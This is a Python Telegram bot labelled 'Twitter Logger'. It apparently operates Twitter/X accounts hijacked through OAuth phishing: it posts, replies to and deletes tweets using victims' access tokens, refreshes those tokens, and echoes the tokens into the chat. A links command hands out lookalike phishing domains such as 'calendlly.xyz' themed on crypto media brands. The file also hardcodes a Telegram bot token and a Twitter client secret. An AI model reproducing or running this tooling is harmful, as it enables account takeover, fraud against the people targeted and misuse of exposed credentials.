import requests
import urllib.parse
import base64
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from keep_alive import keep_alive
keep_alive()

TELEGRAM_BOT_TOKEN = '6790216831:AAHbUIZKq38teKnZIw9zUQDRSD6csT-JEs4'

TWITTER_CLIENT_ID = 'eWNUdkx4LTnaGQ0N3BaSGJyYkU6MTpjaQ'
TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn'


async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text('Welcome to the Twitter Logger')


async def help(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
    text = "ℹ️ *Commands*\n\n • 🐦 */post_tweet <username> <message>* - Posts a tweet on behalf of the user.\n • 💬 */post_reply* <username> <tweetId> <message> - Posts a reply to a tweet on behalf of the user.\n • ❌ */delete_tweet* <username> <tweetId> - Deletes a tweet on behalf of the user.\n • 🔄 */set_redirect* - Sets the redirect upon authorization.\n • ℹ️ */help* - Displays the list of commands."
    parse_mode = "MarkDown"
    
    await context.bot.send_message(chat_id, text, parse_mode)


async def tweet(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            'Usage: /post_tweet <username> <message>')
        return

    access_token = args[0]
    tweet_text = ' '.join(arg.strip()
                          for arg in args[1:]).replace('\\\\n', '\n')

    group_name = update.message.chat.title
    print(f"({group_name}) tweeted: {tweet_text} [{access_token}]\n")

    tweet_url = 'https://api.twitter.com/2/tweets'
    user_lookup_url = 'https://api.twitter.com/2/users/me'
    upload_media_url = 'https://upload.twitter.com/1.1/media/upload.json?media_category=tweet_image'

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    response = requests.get(user_lookup_url, headers=headers)
    response_data = response.json()

    username = response_data['data']['username']

    tweet_data = {'text': tweet_text, 'reply_settings': "mentionedUsers"}
    response = requests.post(tweet_url, json=tweet_data, headers=headers)
    response_data = response.json()

    tweetId = response_data['data']['id']
    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id

    if response.status_code == 201:
        await context.bot.send_message(
            chat_id=chatId,
            text=
            f'✅ *Tweet Posted* ✅\n\nx.com/{username}/status/{tweetId}\n\n🔑 Access Token:\n`{access_token}`',
            parse_mode='MarkDown')
    else:
        await context.bot.send_message(
            chat_id=chatId,
            text=f'🚫 Tweet Failed 🚫\nError: {response_data["title"]}')


async def reply(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            'Usage: /post_reply {accessToken} {tweetId} {text}')
        return

    access_token = args[0]
    tweet_id = args[1]
    tweet_text = ' '.join(arg.strip()
                          for arg in args[2:]).replace('\\\\n', '\n')

    tweet_url = 'https://api.twitter.com/2/tweets'
    user_lookup_url = 'https://api.twitter.com/2/users/me'

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    response = requests.get(user_lookup_url, headers=headers)
    response_data = response.json()

    username = response_data['data']['username']

    tweet_data = {
        'text': tweet_text,
        'reply': {
            'in_reply_to_tweet_id': tweet_id,
        }
    }
    response = requests.post(tweet_url, json=tweet_data, headers=headers)
    response_data = response.json()

    tweetId = response_data['data']['id']
    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id

    if response.status_code == 201:
        await context.bot.send_message(
            chat_id=chatId,
            text=
            f'✅ *Reply Posted* ✅\n\nx.com/{username}/status/{tweetId}\n\n🔑 Access Token:\n`{access_token}`',
            parse_mode='MarkDown')
    else:
        await context.bot.send_message(
            chat_id=chatId,
            text=f'🚫 Tweet Failed 🚫\nError: {response_data["title"]}')


async def refresh(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) < 1:
        await update.message.reply_text('Usage: /refresh {refreshToken}')
        return

    refresh_token = args[0]
    token_refresh_URL = 'https://api.twitter.com/2/oauth2/token'
    headers = {
        'Authorization':
        'Basic ' + base64.b64encode(
            f'{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}'.encode()).decode(),
        'Content-Type':
        'application/x-www-form-urlencoded'
    }
    request_data = {
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token
    }

    try:
        response = requests.post(token_refresh_URL,
                                 data=urllib.parse.urlencode(request_data),
                                 headers=headers)
        response_data = response.json()
        

        new_access_token = response_data['access_token']
        new_refresh_token = response_data['refresh_token']

        user_lookup_url = 'https://api.twitter.com/2/users/me'

        headers = {
            'Authorization': f'Bearer {new_access_token}',
            'Content-Type': 'application/json'
        }

        response = requests.get(user_lookup_url, headers=headers)
        response_data2 = response.json()
        

        username = response_data2['data']['username']

        chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id
        print(f"({update.message.chat.title}) refreshed: (Access Token: {new_access_token}) (Refresh Token: {new_refresh_token}) [@{username if username else 'error'}]\n")

        if response.status_code == 200:
            await context.bot.send_message(
                chat_id=chatId,
                text=
                f'🔄 *Token Refreshed* 🔄\n\n👤 Account:\nx.com/{username}\n\n🔑 Access Token:\n`{new_access_token}`\n\n🔄 Refresh Token:\n`{new_refresh_token}`',
                parse_mode='MarkDown')
        else:
            await update.message.reply_text(
                f'🚫 *Refresh Failed* 🚫\nError: {response_data["error_description"]}',
                parse_mode='MarkDown')
    except Exception as e:
        await update.message.reply_text(
            f'🚫 *Refresh Failed* 🚫\nError: {str(e)}')


async def delete(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            'Usage: /delete_tweet {accessToken} {id}')
        return

    access_token = args[0]
    tweetId = args[1]

    delete_url = f'https://api.twitter.com/2/tweets/{tweetId}'
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    response = requests.delete(delete_url, headers=headers)
    response_data = response.json()

    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id

    if response.status_code == 200:
        await context.bot.send_message(chat_id=chatId,
                                       text='❌ Tweet Deleted ❌')
    else:
        print(response_data)
        await update.message.reply_text(
            f'🚫 Deletion Failed 🚫\nError: {response_data["title"]}')

async def links(update: Update, context: CallbackContext) -> None:
    group_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
    links = []
    ls = []
    if group_id == -4146400715:
        ls = ['https://www\.calendlly\.xyz/coingecko/invitation', 'https://www\.calendlly\.xyz/coinmarketcap/invitation', 'https://www\.calendlly\.xyz/bitcoinmagazine/invitation']
    elif group_id == -4148855237:
        ls = ['https://www\.cointele\.site/cointelegraph/meeting\-hour?month\=2024\-07']
    elif group_id == -4537180005:
        ls = ['https://callendly\.pythonanywhere\.com/cointelegraph']

    print(f"({update.message.chat.title}) retrieved links: [{'] ['.join(ls) if ls else 'None :('}]")
    for link in ls:
        link = f'> 🔗 {link}'
        links.append(link)
    nl = '\n'
    list = nl.join(links)
    await context.bot.send_message(chat_id=group_id, text=f"🔗 *Links* 🔗\n\n{list if links else '> Nothing to see here 👀'}", parse_mode='MarkdownV2')

async def id(update: Update, context: CallbackContext) -> None:
    group_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
    await context.bot.send_message(chat_id=group_id, text=f"🆔 *Group ID* 🆔\n\n`{group_id}`", parse_mode='MarkDown')

def main() -> None:
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("post_tweet", tweet))
    app.add_handler(CommandHandler("post_reply", reply))
    app.add_handler(CommandHandler("refresh", refresh))
    app.add_handler(CommandHandler("delete_tweet", delete))
    app.add_handler(CommandHandler("links", links))
    app.add_handler(CommandHandler("id", id))
    app.run_polling(poll_interval=5)


if __name__ == '__main__':
    main()
